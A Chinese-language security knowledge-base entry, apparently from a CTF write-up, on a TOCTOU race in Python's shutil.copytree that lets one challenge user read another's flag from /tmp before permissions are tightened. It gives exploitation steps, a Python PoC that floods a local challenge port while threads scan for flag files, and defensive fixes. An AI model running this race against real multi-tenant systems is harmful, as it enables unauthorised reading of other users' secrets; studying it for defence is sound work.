---
id: binary-pwn-sandbox-escape-shutil-copytree-permission-race
title: shutil.copytree 目录权限后置导致的跨 challenge 读取竞态
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: copytree-permission-race
tags:
- python
- race-condition
- toctou
- permissions
- sandbox-escape
- multi-tenant
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V126
  verified_at: '2026-11-06T04:11:13+08:00'
  notes: 已对照原文 bctf-infra 段核对：copytree 非原子、目标目录先创建后 copystat 700、扫描 /tmp/*/app/flag.txt + loopback 1337 反复触发 chal3 的竞态利用一致；竞态窗口为概率性，未本机复现。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-shutil-copytree-permission-race/
draft: false
kb_aliases:
- copytree 竞态
- 目录权限 TOCTOU
- 多租户 challenge 越权读 flag
- bctf-infra
---

## 一句话结论

`shutil.copytree()` 不是原子操作：它先用默认权限创建目标目录、复制文件，最后才 `copystat` 把源目录的 `700` 权限同步过去；在这段窗口内，另一个 challenge 用户可遍历 `/tmp/*/app/flag.txt` 读到尚未收紧权限的 flag。

## 原理

- 多租户 challenge 服务器按用户切换 uid/gid，把对应 challenge 目录 `copytree` 到 `/tmp/<随机>/app`，再执行其中的 `chal.py`。
- 源目录被设为 `700`，设计意图是每个 challenge 用户只能读自己的目录。
- `copytree` 的顺序是：创建目标目录（受 umask 影响，通常是 `755`）→ 递归复制内容 → `copystat` 应用源目录的 mode/owner/时间。
- 在复制完成到 `copystat` 之间，目标目录仍是宽松权限；`flag.txt` 已落盘且可能保持可读，其他低权限 challenge 用户可在窗口内打开。
- 窗口很短，但可以反复触发新的 challenge 实例（文章通过 loopback 的 `127.0.0.1:1337` 反复启动 `chal3`），并用多线程持续扫描 `/tmp/*/app/flag.txt`，把概率竞态变成稳定利用。

## 触发条件

- 多租户服务以不同 uid 运行不同 challenge，且把 challenge 目录复制到共享的 `/tmp`。
- 使用 `shutil.copytree()` 等“先复制、后改权限”的实现。
- 攻击者能在某个低权限 challenge 中执行代码，并能连接本地 challenge 调度端口触发新实例。

## 利用步骤

1. 在 `chal1` 中拿到代码执行（如字符黑名单 pyjail）。
2. 起一组线程不断连接 `127.0.0.1:1337` 并发送 `chal3`，制造大量 `copytree` 窗口。
3. 起另一组线程遍历 `/tmp/*/app/flag.txt`，尝试打开并读取。
4. 过滤占位/假 flag（如 `fake{...}`），保留真正的 `bctf{...}`。
5. 命中后立即退出。

## PoC

```python
def watcher():
    while True:
        for name in os.listdir('/tmp'):
            path = '/tmp/' + name + '/app/flag.txt'
            try:
                data = open(path).read().strip()
                if data.startswith('bctf{') and 'fake' not in data:
                    print(data, flush=True)
                    os._exit(0)
            except Exception:
                pass

def trigger():
    for _ in range(700):
        try:
            s = socket.create_connection(('127.0.0.1', 1337), 0.05)
            s.recv(4096)
            s.sendall(b'chal3\n')
            time.sleep(0.001)
            s.sendall(b'\n')
            s.close()
        except Exception:
            pass
```

## 变体与关联

- 任何“复制/解压后 chmod/chown”的实现都有同类窗口（`cp -r` + `chmod`、`tar` 解包后改权限）。
- 也可利用符号链接替换、目标目录预先存在等条件扩大窗口。
- 关联：[[binary-pwn-sandbox-mailbox-toctou-jump-table-parent-rop]]（另一类 TOCTOU 沙箱逃逸）。

## 检测与防御

- 创建目标目录时立即用 `0700`，或复制到每个用户私有的不可遍历目录（如 `mkdtemp` + `0700`）。
- 避免共享 `/tmp` 作为多租户复制目标；使用 mount namespace/容器隔离。
- 复制完成后校验权限；对 `/tmp/*/app` 的异常遍历与短时间大量 challenge 启动做监控。
